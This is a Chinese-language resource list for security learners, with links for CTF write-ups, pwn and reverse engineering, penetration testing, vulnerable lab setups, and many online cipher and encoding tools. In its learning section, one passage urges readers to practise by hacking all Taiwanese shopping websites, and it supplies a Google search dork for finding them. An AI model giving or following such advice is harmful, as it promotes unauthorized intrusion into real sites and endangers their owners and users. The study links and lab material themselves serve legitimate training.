[https://www.jmpoep.com/forum.php](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.jmpoep.com%2Fforum.php)\n CTF常用工具速查网\n https://www.jianshu.com/p/ab24f22599a2\n 黑客街[https://www.hackjie.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.hackjie.com%2F)\n redteam [https://www.itcodemonkey.com/article/6375.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.itcodemonkey.com%2Farticle%2F6375.html)\n Mac下[https://xclient.info](https://links.jianshu.com/go?to=https%3A%2F%2Fxclient.info)\n **WP**\n [https://ctf.writeup.wiki/](https://links.jianshu.com/go?to=https%3A%2F%2Fctf.writeup.wiki%2F)\n [https://www.ctfwp.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ctfwp.com%2F)\n [https://xz.aliyun.com/t/4862](https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4862)\n [https://xz.aliyun.com/t/4904](https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4904)\n\n**PWN学习**\n [https://zoepla.github.io/2018/04/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/](https://links.jianshu.com/go?to=https%3A%2F%2Fzoepla.github.io%2F2018%2F04%2Fpwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F)\n **逆向**\n [https://bbs.pediy.com/thread-247176.htm](https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.pediy.com%2Fthread-247176.htm)\n [https://blog.csdn.net/txwtech/article/details/79189345](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Ftxwtech%2Farticle%2Fdetails%2F79189345)\n [http://www.dtdebug.com/forum.php?mod=viewthread&tid=3211&mobile=2](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.dtdebug.com%2Fforum.php%3Fmod%3Dviewthread%26tid%3D3211%26mobile%3D2)\n [http://www.pansoso.com/g/899437/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.pansoso.com%2Fg%2F899437%2F)\n **渗透测试**\n 渗透脑图\n [https://github.com/Ascotbe/Osmographic-brain-mapping](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAscotbe%2FOsmographic-brain-mapping)\n 1）玄魂工作室--内部资源清单\n [https://github.com/xuanhun/HackingResource](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fxuanhun%2FHackingResource)\n 2）KaliLinuxWeb渗透测试手册(第二版)-6.7-利用XML外部实体注入\n [https://mp.weixin.qq.com/s/6_sbkXFckb29bq08flhAOA](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6_sbkXFckb29bq08flhAOA)\n 3）渗透测试入门指南与路线规划\n [https://gitbook.cn/gitchat/activity/5c303ffe2a982d27f48994d9](https://links.jianshu.com/go?to=https%3A%2F%2Fgitbook.cn%2Fgitchat%2Factivity%2F5c303ffe2a982d27f48994d9)\n 4）全新CTF，内网渗透，web安全教程上线\n [https://mp.weixin.qq.com/s/ukSra269UmRhXYxvsbshng](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FukSra269UmRhXYxvsbshng)\n [https://github.com/hanc00l/wooyun_public](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fhanc00l%2Fwooyun_public)\n [https://findneo.github.io/180308NewbieSecurityList](https://links.jianshu.com/go?to=https%3A%2F%2Ffindneo.github.io%2F180308NewbieSecurityList)\n [https://github.com/DropsOfZut/awesome-security-weixin-official-accounts](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FDropsOfZut%2Fawesome-security-weixin-official-accounts)\n\n[https://github.com/findneo/Newbie-Security-List](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ffindneo%2FNewbie-Security-List)\n [https://github.com/euphrat1ca/fuzzdb-collect](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Feuphrat1ca%2Ffuzzdb-collect)\n [https://github.com/jaywcjlove/handbook](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjaywcjlove%2Fhandbook)\n [https://github.com/jaywcjlove](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjaywcjlove)\n 内网渗透\n [https://bbs.ichunqiu.com/thread-48179-1-1.html](https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.ichunqiu.com%2Fthread-48179-1-1.html)\n k8工具[https://github.com/k8gege/K8tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fk8gege%2FK8tools)\n [https://github.com/truongkma/ctf-tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftruongkma%2Fctf-tools)\n [https://github.com/P1kachu/v0lt](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FP1kachu%2Fv0lt)\n [https://github.com/zardus/ctf-tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fzardus%2Fctf-tools)\n [https://github.com/TUCTF/Tools](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FTUCTF%2FTools)\n **ACM**\n [https://pan.baidu.com/s/1vo-frs9RypuRFCX3WheNxw](https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1vo-frs9RypuRFCX3WheNxw)密码:ugcs\n 一些工具\n **博客**\n [https://impakho.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fimpakho.com%2F)\n [https://evoa.me/](https://links.jianshu.com/go?to=https%3A%2F%2Fevoa.me%2F)\n [https://bestwing.me/#](https://links.jianshu.com/go?to=https%3A%2F%2Fbestwing.me%2F%23)\n [https://cyto.top/](https://links.jianshu.com/go?to=https%3A%2F%2Fcyto.top%2F)\n [http://pupiles.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fpupiles.com%2F)\n [http://sp4rk.cn/index.php/page/1](https://links.jianshu.com/go?to=http%3A%2F%2Fsp4rk.cn%2Findex.php%2Fpage%2F1)\n [https://skysec.top/](https://links.jianshu.com/go?to=https%3A%2F%2Fskysec.top%2F)\n [https://www.cjhsunny.xyz/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cjhsunny.xyz%2F)\n [https://veritas501.space/](https://links.jianshu.com/go?to=https%3A%2F%2Fveritas501.space%2F)\n [http://gv7.me/](https://links.jianshu.com/go?to=http%3A%2F%2Fgv7.me%2F)\n [http://mannix.top/](https://links.jianshu.com/go?to=http%3A%2F%2Fmannix.top%2F)\n [https://www.15qq.cn/sort/bug_poc](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.15qq.cn%2Fsort%2Fbug_poc)\n [http://www.vxia.net/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vxia.net%2F)\n [https://www.chinacycc.com/forum.php?mobile=yes](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.chinacycc.com%2Fforum.php%3Fmobile%3Dyes)\n [https://getpass.cn/](https://links.jianshu.com/go?to=https%3A%2F%2Fgetpass.cn%2F)\n [https://lengjibo.github.io/php%E9%BB%91%E9%AD%94%E6%B3%95/](https://links.jianshu.com/go?to=https%3A%2F%2Flengjibo.github.io%2Fphp%E9%BB%91%E9%AD%94%E6%B3%95%2F)\n [http://www.admintony.com/%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.admintony.com%2F%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html)\n [https://github.com/NationalSecurityAgency](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FNationalSecurityAgency)\n [https://github.com/YadominJinta/atilo/blob/master/CN/README_CN.md](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FYadominJinta%2Fatilo%2Fblob%2Fmaster%2FCN%2FREADME_CN.md)\n [https://bbs.ichunqiu.com/thread-49370-1-1.html](https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.ichunqiu.com%2Fthread-49370-1-1.html)\n [https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/-](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.certilience.fr%2F2019%2F03%2Ftomcat-exploit-variant-host-manager%2F-)\n [https://www.freebuf.com/articles/web/135342.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F135342.html)\n [https://www.giantbranch.cn/archives/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.giantbranch.cn%2Farchives%2F)\n [https://c1h2e1.github.io/?title:RPO](https://links.jianshu.com/go?to=https%3A%2F%2Fc1h2e1.github.io%2F%3Ftitle%3ARPO)\n [https://ptriker.github.io/?nsukey=i5ksp6ydekZ5gVkkzAillrRQbCM9m%2FEzuAESN0ysr648ghZbs%2FRX02k5ZurIP64Ms7%2B8bjHEc6KXxHVA4f18XdgBHyMczVFh1ACn9tR1haPSbPMbZubLg7pvyRdzNNucagm403QF2oasTKlZHlM6xWsATEITusqjpSTUXUDgdYxH9Tpm3RcXb6nvNyB%2B3K%2BuTpVWldTI8tgLH8xPtUbOOw%3D%3D](https://links.jianshu.com/go?to=https%3A%2F%2Fptriker.github.io%2F%3Fnsukey%3Di5ksp6ydekZ5gVkkzAillrRQbCM9m%2FEzuAESN0ysr648ghZbs%2FRX02k5ZurIP64Ms7%2B8bjHEc6KXxHVA4f18XdgBHyMczVFh1ACn9tR1haPSbPMbZubLg7pvyRdzNNucagm403QF2oasTKlZHlM6xWsATEITusqjpSTUXUDgdYxH9Tpm3RcXb6nvNyB%2B3K%2BuTpVWldTI8tgLH8xPtUbOOw%3D%3D)\n [https://mp.weixin.qq.com/s?__biz=MzI3MTY5NzI2Mw==&mid=2247484108&idx=1&sn=2eb978edf55dbb22e3cee6bc06817605&chksm=eb3c96ccdc4b1fdac935e5394b7d1d422ae2fbf896fc46593667f96c0c2c1a63ec9a6cc1cb61&xtrack=1&scene=0&subscene=131&clicktime=1555484172&ascene=7&devicetype=android-27&version=2700033c&nettype=cmnet&abtest_cookie=BAABAAoACwASABMABQAjlx4AVpkeAMWZHgDTmR4A3JkeAAAA&lang=zh_CN&pass_ticket=aI%2B01Ha04R%2BVUYVe2%2FJK8c%2F8giqYlhSNP49ouTILhotOyjFzamhCHjg%2FmVq%2BLFoJ&wx_header=1](https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI3MTY5NzI2Mw%3D%3D%26mid%3D2247484108%26idx%3D1%26sn%3D2eb978edf55dbb22e3cee6bc06817605%26chksm%3Deb3c96ccdc4b1fdac935e5394b7d1d422ae2fbf896fc46593667f96c0c2c1a63ec9a6cc1cb61%26xtrack%3D1%26scene%3D0%26subscene%3D131%26clicktime%3D1555484172%26ascene%3D7%26devicetype%3Dandroid-27%26version%3D2700033c%26nettype%3Dcmnet%26abtest_cookie%3DBAABAAoACwASABMABQAjlx4AVpkeAMWZHgDTmR4A3JkeAAAA%26lang%3Dzh_CN%26pass_ticket%3DaI%2B01Ha04R%2BVUYVe2%2FJK8c%2F8giqYlhSNP49ouTILhotOyjFzamhCHjg%2FmVq%2BLFoJ%26wx_header%3D1)\n 域渗透\n [https://start.me/p/X20Apn](https://links.jianshu.com/go?to=https%3A%2F%2Fstart.me%2Fp%2FX20Apn)\n LiveOverflow-YouTube\n\n[https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.youtube.com%2Fchannel%2FUClcE-kVhqyiHCcjYwcpfj9w)\n [http://vipread.com/index](https://links.jianshu.com/go?to=http%3A%2F%2Fvipread.com%2Findex)这里面有些信息收集的ppt�\n\nPOC编写指南\n [https://poc.evalbug.com/chapter1/1.html](https://links.jianshu.com/go?to=https%3A%2F%2Fpoc.evalbug.com%2Fchapter1%2F1.html)\n CTF入门指南\n 新手的渗透学习流程：\n 1、有哪些漏洞需要了解？\n SQL注入、XSS、上传、csrf、xsrf、ssrf、crlf、xxe、url跳转、任意文件下载（读取）、弱口令、暴库、信息泄露、\n 域传送、跨域（cors、jsonp、crossdomain）、反序列化、远程命令执行、拒绝服务、配置错误等等\n\n\n\n```undefined\n逻辑：任意用户注册（登录、密码重置），支付漏洞，劫持，参数污染，条件竞争等等\ncms漏洞：phpcms，dedecms，discuz、drupal、wordpress、spring、struts2、jboss、weblogic、joomla、jenkins等等\n端口漏洞：elasticsearch、samba、redis、mongodb、zookeeper、memcache、hadoop、couchdb、ldap、rsync等等\nFUZZ字典（CRLF、jsonp、ua、url、xss、xxe、rce、dir、upload、sql、name、password）等等\n```\n\n2、学习地址？\n 各种漏洞                                        [http://wiki.chamd5.org/](https://links.jianshu.com/go?to=http%3A%2F%2Fwiki.chamd5.org%2F)\n [https://github.com/JnuSimba/MiscSecNotes](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FJnuSimba%2FMiscSecNotes)\n web漏洞总结                                     [https://github.com/CHYbeta/Web-Security-Learning](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FCHYbeta%2FWeb-Security-Learning)\n 乌云镜像\n [https://www.madebug.net/](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.madebug.net%2F)                                        [https://wooyun.shuimugan.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fwooyun.shuimugan.com%2F)\n cms漏洞                                           [https://github.com/Lucifer1993/AngelSword](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FLucifer1993%2FAngelSword)\n 国外漏洞                                        [https://pentester.land/list-of-bug-bounty-writeups.html#bug-bounty-writeups-published-in-2019](https://links.jianshu.com/go?to=https%3A%2F%2Fpentester.land%2Flist-of-bug-bounty-writeups.html%23bug-bounty-writeups-published-in-2019)\n 更多学习地址尽在内部群\n\n3、靶场\n 靶场：                                         [http://www.freebuf.com/sectool/4708.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.freebuf.com%2Fsectool%2F4708.html)\n 漏洞靶场，docker搭建，有些靶场内附py文件        [https://github.com/vulhub/vulhub](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub)\n [https://github.com/Medicean/VulApps/](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FMedicean%2FVulApps%2F)\n [http://vulapps.evalbug.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fvulapps.evalbug.com%2F)\n [https://github.com/SecWiki/CMS-Hunter](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecWiki%2FCMS-Hunter)\n [https://github.com/klionsec/PhishingExploit](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fklionsec%2FPhishingExploit)\n [http://www.vulnspy.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vulnspy.com%2F)\n 上传漏洞靶场：                                 [https://github.com/c0ny1/upload-labs](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fupload-labs)\n XXE漏洞靶场：                                    [https://github.com/c0ny1/xxe-lab](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fxxe-lab)\n 一键搭建12个漏洞平台                         [https://github.com/c0ny1/vulstudy](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fvulstudy)\n 各类型漏洞靶场                                 [https://github.com/gh0stkey/DoraBox](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fgh0stkey%2FDoraBox)\n AWD环境搭建[http://jjhpkcr.xyz/2019/04/29/awd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/?nsukey=kcT7oaLLx%2F3Q0VheLEIO8Q55G6oKg2SqndxYrxHuBIwIC9EJrMN5CiaxTViTDgqvLtkotKJ9ZG4VYbWbrh7%2FRtbPFeUBcrtgPD9w%2BEOBAhgbpE0AuJIEbkKejTBQA3fakFvfaKTbwYmgfXUBd8Z4d1RUEo%2FvbixapICHuWpeZWu54lhmYUNqod6EdJG7fCEVA8kUBsT7oRBJH6NNyDy4wA%3D%3D](https://links.jianshu.com/go?to=http%3A%2F%2Fjjhpkcr.xyz%2F2019%2F04%2F29%2Fawd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%2F%3Fnsukey%3DkcT7oaLLx%2F3Q0VheLEIO8Q55G6oKg2SqndxYrxHuBIwIC9EJrMN5CiaxTViTDgqvLtkotKJ9ZG4VYbWbrh7%2FRtbPFeUBcrtgPD9w%2BEOBAhgbpE0AuJIEbkKejTBQA3fakFvfaKTbwYmgfXUBd8Z4d1RUEo%2FvbixapICHuWpeZWu54lhmYUNqod6EdJG7fCEVA8kUBsT7oRBJH6NNyDy4wA%3D%3D)\n\n4、如何学习\n 多逛论坛：i春秋、吐司、90等等\n 多看大佬博客\n 和志同道合的小伙伴一起挖洞\n\n\n\n```css\n想实战检验自己的学习成果，就去把台湾的所有商城网站挖一遍。谷歌语法:site:*.tw商城\n挖完了所有商城网站，可以去挖各大SRC。\n```\n\n如何入门？如何组队？\n\ncapturetheflag夺旗比赛\n\n类型：\n\nWeb\n 密码学\n xssee:[http://web2hack.org/xssee](https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee)\n\nxssee:[http://evilcos.me/lab/xssee](https://links.jianshu.com/go?to=http%3A%2F%2Fevilcos.me%2Flab%2Fxssee)\n\n(DES,3DES,AES,RC,Blowfish,Twofish,Serpent,Gost,Rijndael,Cast,Xtea,RSA):[http://tool.chacuo.net/cryptdes](https://links.jianshu.com/go?to=http%3A%2F%2Ftool.chacuo.net%2Fcryptdes)\n\n在线编码解码(多种并排):[http://bianma.911cha.com](https://links.jianshu.com/go?to=http%3A%2F%2Fbianma.911cha.com)\n\n在线加密解密(多种):[http://encode.chahuo.com](https://links.jianshu.com/go?to=http%3A%2F%2Fencode.chahuo.com)\n\nUnicode转中文:[http://www.bejson.com/convert/unicode_chinese](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com%2Fconvert%2Funicode_chinese)\n\n栅栏密码&&凯撒密码&&摩斯电码:[http://heartsnote.com/tools/cipher.htm](https://links.jianshu.com/go?to=http%3A%2F%2Fheartsnote.com%2Ftools%2Fcipher.htm)\n\nCaesarcipher(凯撒密码):[http://planetcalc.com/1434/](https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F1434%2F)\n\nQuoted-Printable&&ROT13:[http://www.mxcz.net/tools/QuotedPrintable.aspx](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.mxcz.net%2Ftools%2FQuotedPrintable.aspx)\n\nROT5/13/18/47编码转换:[http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fbianma%2FROT5-13-18-47.php)\n\nBase32/16:[http://pbaseconverter.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fpbaseconverter.com%2F)\n\nBase32:[https://tools.deamwork.com/crypt/decrypt/base32decode.html](https://links.jianshu.com/go?to=https%3A%2F%2Ftools.deamwork.com%2Fcrypt%2Fdecrypt%2Fbase32decode.html)\n\nquipqiup古典密码自动化爆破(词频分析):[http://quipqiup.com/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Fquipqiup.com%2Findex.php)\n\n词频分析/替换:[http://cryptoclub.org/tools/cracksub_topframe.php](https://links.jianshu.com/go?to=http%3A%2F%2Fcryptoclub.org%2Ftools%2Fcracksub_topframe.php)\n\n'+.<>[]'&&'!.?'(Brainfuck/Ook!):[https://www.splitbrain.org/services/ook](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.splitbrain.org%2Fservices%2Fook)\n\n'+-.<>[]'(Brainfuck):[https://www.nayuki.io/page/brainfuck-interpreter-javascript](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.nayuki.io%2Fpage%2Fbrainfuck-interpreter-javascript)\n\n'+-.<>[]'(Brainfuck):[http://esoteric.sange.fi/brainfuck/impl/interp/i.html](https://links.jianshu.com/go?to=http%3A%2F%2Fesoteric.sange.fi%2Fbrainfuck%2Fimpl%2Finterp%2Fi.html)\n\n'()[]!+'JavaScript编码(JSfuck):[http://discogscounter.getfreehosting.co.uk/js-noalnum.php](https://links.jianshu.com/go?to=http%3A%2F%2Fdiscogscounter.getfreehosting.co.uk%2Fjs-noalnum.php)\n\n用6个字符'()[]!+'来编写JavaScript程序(JSfuck同上):[http://www.jsfuck.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jsfuck.com%2F)\n\n[http://patriciopalladino.com/files/hieroglyphy/](https://links.jianshu.com/go?to=http%3A%2F%2Fpatriciopalladino.com%2Ffiles%2Fhieroglyphy%2F)\n\n摩斯密码翻译器:[http://www.jb51.net/tools/morse.htm](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jb51.net%2Ftools%2Fmorse.htm)\n\nMorseCode摩尔斯电码:[http://rumkin.com/tools/cipher/morse.php](https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2Fmorse.php)\n\n摩尔斯电码转换器:[http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.zhongguosou.com%2Fzonghe%2FmoErSiCodeConverter.aspx)\n\n字符串编码，解码，转换(长度,反转,进制转换):[http://www.5ixuexiwang.com/str/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.5ixuexiwang.com%2Fstr%2F)\n\nCiscoType7Reverser:[http://packetlife.net/toolbox/type7](https://links.jianshu.com/go?to=http%3A%2F%2Fpacketlife.net%2Ftoolbox%2Ftype7)\n\nCisco:[http://www.ifm.net.nz/cookbooks/passwordcracker.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ifm.net.nz%2Fcookbooks%2Fpasswordcracker.html)\n\ncmd5&&NTLM&&mysql...:[http://www.cmd5.com](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cmd5.com)\n\nspammimic(字符2一段话):[http://www.spammimic.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.spammimic.com%2F)\n\njs代码在线加密解密:[https://tool.lu/js/](https://links.jianshu.com/go?to=https%3A%2F%2Ftool.lu%2Fjs%2F)\n\nJScript/VBscript脚本解密(#@^....^#@):[http://www.dheart.net/decode/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.dheart.net%2Fdecode%2Findex.php)\n\nVBScript.Encode解密([tip:Aspencode):http://adophper.com/encode.html](https://links.jianshu.com/go?to=tip%3AAspencode)%3Ahttp%3A%2F%2Fadophper.com%2Fencode.html)\n\nJScript.Encode脚本加密与解密:[http://www.haokuwang.com/jsendecode.htm](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.haokuwang.com%2Fjsendecode.htm)\n\n'+/v+'UTF-7加密:[http://web2hack.org/xssee](https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee)\n\n各种无知密码解密:[http://www.tools88.com](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.tools88.com)\n\nuuencode解码&&xxencode解码(古老的邮件密码):[http://web.chacuo.net/charsetuuencode](https://links.jianshu.com/go?to=http%3A%2F%2Fweb.chacuo.net%2Fcharsetuuencode)\n\nMIME标准(邮件编码的一种):[http://dogmamix.com/MimeHeadersDecoder/](https://links.jianshu.com/go?to=http%3A%2F%2Fdogmamix.com%2FMimeHeadersDecoder%2F)\n\nBinhex编码(邮件编码的一种,常见于MAC机):[http://encoders-decoders.online-domain-tools.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fencoders-decoders.online-domain-tools.com%2F)\n\n%u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee):[http://web.chacuo.net/charsetescape](https://links.jianshu.com/go?to=http%3A%2F%2Fweb.chacuo.net%2Fcharsetescape)\n\n猪圈密码:[http://www.simonsingh.net/The_Black_Chamber/pigpen.html](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.simonsingh.net%2FThe_Black_Chamber%2Fpigpen.html)\n\nppencode(把Perl代码转换成只有英文字母的字符串):[http://namazu.org/~takesako/ppencode/demo.html](https://links.jianshu.com/go?to=http%3A%2F%2Fnamazu.org%2F~takesako%2Fppencode%2Fdemo.html)\n\naaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密):[http://utf-8.jp/public/aaencode.html](https://links.jianshu.com/go?to=http%3A%2F%2Futf-8.jp%2Fpublic%2Faaencode.html)\n\n'()[]!+'&&'$=~[]+\"_.();'jother编码jjencode(JS代码转换成只有符号的字符串):[http://web2hack.org/xssee](https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee)\n\njother（是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：!+()[]{}。只用这些字符就能完成对任意字符串的编码）:[http://tmxk.org/jother/](https://links.jianshu.com/go?to=http%3A%2F%2Ftmxk.org%2Fjother%2F)\n\njjencode/aaencode可用xssee&&Chrome的Console模式来直接输出解密。\n\nManchester曼彻斯特解密：[http://eleif.net/manchester.html](https://links.jianshu.com/go?to=http%3A%2F%2Feleif.net%2Fmanchester.html)\n\nVigenère维多利亚解密：[https://www.guballa.de/vigenere-solver](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.guballa.de%2Fvigenere-solver)\n\nVigenèrecipher:[http://planetcalc.com/2468/](https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F2468%2F)\n\nHillcipher(希尔密码):[http://planetcalc.com/3327/](https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F3327%2F)\n\nAtbashcipher(埃特巴什码):[http://planetcalc.com/4647/](https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F4647%2F)\n\nsnow(html隐写):[http://fog.misty.com/perry/ccs/snow/snow/snow.html](https://links.jianshu.com/go?to=http%3A%2F%2Ffog.misty.com%2Fperry%2Fccs%2Fsnow%2Fsnow%2Fsnow.html)\n\nSerpent加密解密:[http://serpent.online-domain-tools.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fserpent.online-domain-tools.com%2F)\n\n十六进制Hex转文本字符串:[http://www.bejson.com/convert/ox2str/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com%2Fconvert%2Fox2str%2F)\n\nHex2text:[http://www.convertstring.com/EncodeDecode/HexDecode](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.convertstring.com%2FEncodeDecode%2FHexDecode)\n\nBinary(二进制)，ACSII,Hex(十六进制),Decimal(十进制):[http://www.binaryhexconverter.com/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.binaryhexconverter.com%2F)\n\n集合:[http://www.qqxiuzi.cn/daohang.htm](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fdaohang.htm)\n\n集合（各种古典密码）:[http://rumkin.com/tools/cipher/](https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2F)\n\n文本加密为汉字(\"盲文\"，音符，各种语言，花朵，箭头...):[http://www.qqxiuzi.cn/bianma/wenbenjiami.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fbianma%2Fwenbenjiami.php)\n\n在线繁体字转换器:[http://www.aies.cn](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.aies.cn)\n\n在线工具集合:[http://tomeko.net/online_tools/](https://links.jianshu.com/go?to=http%3A%2F%2Ftomeko.net%2Fonline_tools%2F)\n\n二维码/条形码:[https://online-barcode-reader.inliteresearch.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fonline-barcode-reader.inliteresearch.com%2F)\n\n生成二维码:[http://www.wwei.cn/](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wwei.cn%2F)\n\n在线二维码解密:[http://jiema.wwei.cn/](https://links.jianshu.com/go?to=http%3A%2F%2Fjiema.wwei.cn%2F)\n\nImage2Base64:[http://www.vgot.net/test/image2base64.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vgot.net%2Ftest%2Fimage2base64.php)\n\n与佛论禅:[http://www.keyfc.net/bbs/tools/tudoucode.aspx](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.keyfc.net%2Fbbs%2Ftools%2Ftudoucode.aspx)\n\n在线分解GIF帧图:[http://zh.bloggif.com/gif-extract](https://links.jianshu.com/go?to=http%3A%2F%2Fzh.bloggif.com%2Fgif-extract)\n\nbejson(杂乱):[http://www.bejson.com](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com)\n\natool(杂乱):[http://www.atool.org](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.atool.org)\n\nPunchCard:[http://www.kloth.net/services/cardpunch.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.kloth.net%2Fservices%2Fcardpunch.php)\n\n分解素数(ESA):[http://www.factordb.com/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.factordb.com%2Findex.php)\n\n文件在线Hash:[http://www.atool.org/file_hash.php](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.atool.org%2Ffile_hash.php)\n pwn程序的逻辑分析，漏洞利用windows、linux、小型机等\n 